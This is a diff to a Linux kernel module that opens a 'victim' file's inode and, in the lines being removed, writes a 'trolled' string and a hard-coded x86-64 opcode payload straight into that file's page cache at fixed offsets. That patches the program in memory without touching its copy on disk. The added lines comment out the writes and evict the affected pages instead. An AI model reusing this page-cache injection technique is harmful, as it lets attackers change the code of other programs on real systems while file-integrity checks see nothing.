@@ -18,7 +18,7 @@ char* troll = "trolled";
 char trolling_opcodes[] = { 0x48, 0x8D, 0x35, 0x10, 0x94, 0x08, 0x00, 0x48, 0xC7, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x01, 0x00, 0x00, 0x00 }  ; //append with a shit ton of nops
 int init_module(void)
 {
-  char* path = TOSTRING(VICTIM_FILE);//VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE)
+  char* path = VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//VICTIM_FILE_OVERRIDE;////VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE);//VICTIM_FILE_OVERRIDE;//TOSTRING(VICTIM_FILE)
   	struct inode* i = get_file_path(path);//
   if(!i){
     printk(KERN_INFO "Invalid path\n");
@@ -33,13 +33,12 @@ int init_module(void)
   printk(KERN_INFO "This page has an address_space object - it is likely file-mapped\n");
 
   //unmap_page(i, 0x00107c10);
-  write_string_page_cache_iter(i, 0x00191027, troll, 8);
-  write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21);
-  //unmap_page(i, 0x00107c10);
-  //unmap_page(i, 0x00191027);
+  //write_string_page_cache(i, 0x00191027, troll, 8);
+  //write_string_page_cache(i, 0x00107c10, trolling_opcodes, 21);
+  remove_page(i, 0x00107c10); //extraction confirmed
+  remove_page(i, 0x00191027);
   return 0;
 }
-
 void cleanup_module(void)
 {
 	printk("Module cleanup\n");
